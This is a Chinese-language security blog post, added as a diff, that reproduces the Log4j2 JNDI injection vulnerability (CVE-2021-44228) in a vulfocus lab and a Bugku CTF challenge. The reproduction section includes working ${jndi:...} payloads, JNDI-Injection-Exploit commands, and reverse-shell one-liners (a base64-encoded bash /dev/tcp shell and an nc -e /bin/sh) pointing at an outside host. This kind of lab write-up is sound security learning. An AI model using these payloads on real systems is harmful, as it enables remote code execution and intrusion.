@@ -1,0 +1,121 @@
+<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content=""><meta name="theme-color" content="#2d4356"><meta name="baidu-site-verification"><title>log4j2的简单复现 | sakura</title><link rel="stylesheet" type="text/css" href="/css/style.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.png"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="sakura" type="application/atom+xml">
+</head><link rel="stylesheet" type="text/css" href="/plugins/highlight/atom-one-dark.min.css"><script type="text/javascript" src="/plugins/highlight/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();
+</script><script type="text/javascript" src="/js/ready.js" async></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"><body class="night"><div class="mobile-head" id="mobile-head"><div class="navbar-icon"><span></span><span></span><span></span></div><div class="navbar-title"><a href="/">LITREILY</a></div><div class="navbar-search"><!--= show a circle here--></div></div><div class="h-wrapper" id="menu"><nav class="h-head box"><div class="m-hdimg"><a class="hdimg img" href="/"><img class="nofancybox" src="/img/profile.jpg" width="128" height="128"></a><h1 class="ttl"><a href="/">sakura</a></h1></div><p class="m-desc">那就祝我们有讲不完的笑话和数不尽的浪漫</p><div class="m-nav"><ul><li><span class="dot">●</span><a href="/archives/">归档</a></li><li><span class="dot">●</span><a href="/categories/">分类</a></li><li><span class="dot">●</span><a href="/tags/">标签</a></li><li><span class="dot">●</span><a href="/about/">关于</a></li><li><span class="dot">●</span><a href="/atom.xml">RSS</a></li><li class="m-sch"><form class="form" id="j-formsch" method="get"><input class="txt" type="text" id="local-search-input" name="q" value="搜索" onfocus="if(this.value=='搜索'){this.value='';}" onblur="if(this.value==''){this.value='搜索';}"><input type="text" style="display:none;"></form></li></ul><div id="local-search-result"></div></div></nav></div><div id="back2Top"><a class="fa fa-arrow-up" title="Back to top" href="#"></a></div><div class="box" id="container"><div class="l-wrapper"><div class="l-content box"><div class="l-post l-post-art"><article class="p-art"><div class="p-header box"><h1 class="p-title">log4j2的简单复现</h1><div class="p-info"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/">2022-04-23</a></span><span class="p-category"><i class="fa fa-folder"></i><a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>&nbsp;&bull;&nbsp;<a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></span><span class="p-view" id="busuanzi_container_page_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_page_pv"></span></span></div></div><div class="p-content"><p>之前只是简略看了看这个漏洞，但是并没有及时复现，但是发现这个漏洞hw问的很多，所以还是及时复现一下吧。</p>
+<h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p><a target="_blank" rel="noopener" href="https://logging.apache.org/log4j/2.x/index.html">Apache Log4j2</a> 是 Apache 软件基金会下的一个<a target="_blank" rel="noopener" href="https://github.com/apache/logging-log4j2">开源</a>的基于 Java 的日志记录工具。Log4j2 是一个 Log4j 1.x 的重写，并且引入了大量丰富的特性。该日志框架被大量用于业务系统开发，用来记录日志信息。由于其优异的性能而被广泛的应用于各种常见的 Web 服务中。</p>
+<p>2021 年 12 月 9 日晚，Log4j2 的一个远程代码执行漏洞的利用细节被公开。攻击者使用 <code>$&#123;&#125;</code> 关键标识符触发 JNDI 注入漏洞，当程序将用户输入的数据进行日志记录时，即可触发此漏洞，成功利用此漏洞可以在目标服务器上执行任意代码。</p>
+<p>漏洞编号：<a target="_blank" rel="noopener" href="https://www.cve.org/CVERecord?id=CVE-2021-44228">CVE-2021-44228</a></p>
+<p>- 漏洞：Log4j2 的 JNDI 功能点无法防御来自攻击者的 ldap 以及其他相关端点的攻击行为。<br>- 严重等级：Critical<br>- Basic CVSS 评分：10.0 CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H<br>- 影响版本：all versions from 2.0-beta9 to 2.14.1</p>
+<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>由于本人代码功底有限，就大概说明下，不进行代码跟进了。</p>
+<p>log4j2提供了一种叫<code>lookups</code>的功能来写日志</p>
+<p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/webp.webp" alt="img"></p>
+<p>而漏洞成因就是log4j2支持<code>Jndi Lookup</code></p>
+<p>日志中包含 <code>$&#123;&#125;</code>,lookup功能就会将表达式的内容替换为表达式解析后的内容，而不是表达式本身。log4j 2将基本的解析都做了实现：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/27307869-0dd3def6ff8e3f96.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/976/format/webp" alt="img"></p>
+<p>常见解析：</p>
+<pre><code>$&#123;ctx:loginId&#125;
+$&#123;map:type&#125;
+$&#123;filename&#125;
+$&#123;date:MM-dd-yyyy&#125;
+$&#123;docker:containerId&#125;$&#123;docker:containerName&#125;
+$&#123;docker:imageName&#125;
+$&#123;env:USER&#125;
+$&#123;event:Marker&#125;
+$&#123;mdc:UserId&#125;
+$&#123;java&#125;
+$&#123;jndi:logging/context-name&#125;
+$&#123;hostName&#125;
+$&#123;docker:containerId&#125;
+$&#123;k8s&#125;
+$&#123;log4j&#125;
+$&#123;main&#125;
+$&#123;name&#125;
+$&#123;marker&#125;
+$&#123;spring&#125;
+$&#123;sys:logPath&#125;
+$&#123;web:rootDir&#125;
+</code></pre>
+<p>JNDI就是提供一个目录系统，并将服务与对象关联起来，可以使用名称来访问对象。而log4j 2中JNDI解析未作限制，可以直接访问到远程对象,如果是自己的服务器还好说，那如果访问到黑客的服务器呢？</p>
+<p>也就是当记录日志的一部分是用户可控时(比如输入用户名和密码时)，就可以构造恶意字符串使服务器记录日志时调用JNDI访问恶意对象，也就是流传出的payload构成：</p>
+<p>${jndi:ldap:xxx.xxx.xxx.xxx:xxxx/exp}</p>
+<h1 id="复现流程"><a href="#复现流程" class="headerlink" title="复现流程"></a>复现流程</h1><p><strong>环境1 失败</strong></p>
+<p>环境:<a target="_blank" rel="noopener" href="http://vulfocus.io/">http://vulfocus.io/</a></p>
+<p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220423225000889.png" alt="image-20220423225000889"></p>
+<p>测试一下是否存在log4j2,使用网站:<a target="_blank" rel="noopener" href="http://dnslog.cn/">http://dnslog.cn/</a></p>
+<p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220423230017138.png" alt="image-20220423230017138"></p>
+<pre><code>xxxx?payload=$&#123;jndi:ldap://37zwcc.dnslog.cn/exp&#125;
+</code></pre>
+<p>有个很重要一点，要对特殊字符进行url编码</p>
+<p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220423225440706.png" alt="image-20220423225440706"></p>
+<p>成功回显，证明有漏洞</p>
+<p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220423230128737.png" alt="image-20220423230128737"></p>
+<p>在vps上运行jndi注入工具:</p>
+<p>链接:<a target="_blank" rel="noopener" href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a></p>
+<p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220423230550825.png" alt="image-20220423230550825"></p>
+<pre><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDguMTY2LjIwMS4xNi82NjY3IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A &quot;108.166.xx.xx&quot;
+</code></pre>
+<p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220423231525347.png" alt="image-20220423231525347"></p>
+<p>nc监听:</p>
+<p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220423231620210.png" alt="image-20220423231620210"></p>
+<p>构造payload</p>
+<pre><code>$&#123;jndi:rmi://108.166.201.16:1099/xodh7q&#125;
+</code></pre>
+<p>还是进行url编码</p>
+<p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220424000703924.png" alt="image-20220424000703924"></p>
+<p>按理说就可以了，但是我在这个环境并没有成功</p>
+<p><strong>环境2 成功</strong></p>
+<p>感觉上面的环境有点问题，一直无法反弹shell，无论是bin/bash 还是nc都反弹失败了，下面采用bugku环境复现</p>
+<p>url:<a target="_blank" rel="noopener" href="https://ctf.bugku.com/challenges/detail/id/340.html">https://ctf.bugku.com/challenges/detail/id/340.html</a></p>
+<p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220424000909413.png" alt="image-20220424000909413"></p>
+<p>打一下poc，测试下是否存在漏洞</p>
+<p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220424001013346.png" alt="image-20220424001013346"></p>
+<p>ojbk，回显了</p>
+<p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220424001036572.png" alt="image-20220424001036572"></p>
+<p>在Linux上启动服务</p>
+<pre><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;nc 108.166.xx.xx 4444 -e /bin/sh&quot; -A 108.166.xx.xx
+</code></pre>
+<p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220424001128315.png" alt="image-20220424001128315"></p>
+<p>直接构造payload</p>
+<pre><code>$&#123;jndi:rmi://108.166.201.16:1099/dwqsay&#125;
+</code></pre>
+<p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220424000441276.png" alt="image-20220424000441276"></p>
+<p>成功反弹shell</p>
+<p><img src="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/image-20220424000428361.png" alt="image-20220424000428361"></p>
+</div><div class="p-copyright"><blockquote><div class="p-copyright-author"><span class="p-copyright-key">本文作者：</span><span class="p-copytight-value"><a href="mailto:litreily@163.com">sakura</a></span></div><div class="p-copyright-link"><span class="p-copyright-key">本文链接：</span><span class="p-copytight-value"><a href="/2022/04/23/log4j2%E7%9A%84%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/">https://sakurahack-y.github.io/2022/04/23/log4j2的简单复现/</a></span></div><div class="p-copyright-note"><span class="p-copyright-key">版权声明：</span><span class="p-copytight-value">本博客所有文章除特殊声明外，均采用<a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"> CC BY-NC 4.0 </a>许可协议。转载请注明出处 <a href="https://sakurahack-y.github.io">sakura的博客</a>！</span></div></blockquote></div></article><div class="p-info box"><span class="p-tags"><i class="fa fa-tag"></i><a href="/tags/log4j2/">log4j2</a></span></div><aside id="toc"><div class="toc-title">目录</div><nav><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%E6%B5%81%E7%A8%8B"><span class="toc-number">3.</span> <span class="toc-text">复现流程</span></a></li></ol></nav></aside></div><section class="p-ext"><div class="l-pager l-pager-dtl box"><a class="next" href="/2022/04/22/web%E9%9A%8F%E7%BC%98%E5%88%B7%E7%B3%BB%E5%88%97-0x01/">web随缘刷系列-0x01 &gt;</a></div><div id="valine-comment"><style type="text/css">.night .v[data-class=v] a { color: #0F9FB4 !important; }
+.night .v[data-class=v] a:hover { color: #216C73 !important; }
+.night .v[data-class=v] li { list-style: inherit; }
+.night .v[data-class=v] .vwrap { border: 1px solid #223441; border-radius: 0; }
+.night .v[data-class=v] .vwrap:hover { box-shadow: 0 0 6px 1px #223441; }
+.night .v[data-class=v] .vbtn { border-radius: 0; background: none; }
+.night .v[data-class=v] .vlist .vcard .vh { border-bottom-color: #293D4E; }
+.night .v[data-class=v] .vwrap .vheader .vinput { border-bottom-color: #223441; }
+.night .v[data-class=v] .vwrap .vheader .vinput:focus { border-bottom-color: #339EB4; }
+.night .v[data-class=v] code, .night .v[data-class=v] pre,.night .v[data-class=v] .vlist .vcard .vhead .vsys { background: #203240 !important; }
+.night .v[data-class=v] code, .night .v[data-class=v] pre { color: #F0F0F0; font-size: 95%; }
+.v[data-class=v] .vcards .vcard .vh {border-bottom-color: #223441; }
+.night .v[data-class=v] .vcards .vcard .vcontent.expand:before {background: linear-gradient(180deg,rgba(38,57,73,.4),rgba(38,57,73,.9));}
+.night .v[data-class=v] .vcards .vcard .vcontent.expand:after {background: rgba(38,57,73,.9)}
+</style><div id="vcomment"></div><script src="//cdn.bootcdn.net/ajax/libs/valine/1.4.14/Valine.min.js"></script><script>var notify = 'false' == true ? true : false;
+var verify = 'false' == true ? true : false;
+var GUEST_INFO = ['nick','mail','link'];
+var guest_info = 'nick,mail,link'.split(',').filter(function(item){
+  return GUEST_INFO.indexOf(item) > -1
+});
+guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
+window.valine = new Valine({
+  el:'#vcomment',
+  notify:notify,
+  verify:verify,
+  appId:'',
+  appKey:'',
+  lang: 'zh-cn',
+  placeholder:'ヾﾉ≧∀≦)o Come on, say something...',
+  avatar:'identicon',
+  guest_info:guest_info,
+  pageSize:'10'
+})</script></div></section><footer><p>Copyright © 2016 - 2022 <a href="/." rel="nofollow">sakura</a> | <strong><a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a></strong><br><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span></span> <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span></span> | Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a>Theme with<a rel="nofollow" target="_blank" href="https://github.com/litreily/snark-hexo"> snark.</a></p></footer></div></div></div><script type="text/javascript" src="/js/search.js"></script><script type="text/javascript" src="/js/top.js"></script><script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script>var search_path = 'search.xml';
+if (search_path.length == 0) {
+    search_path = 'search.xml';
+}
+var path = '/' + search_path;
+searchFunc(path, 'local-search-input', 'local-search-result');
+</script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1" async></script></body></html>
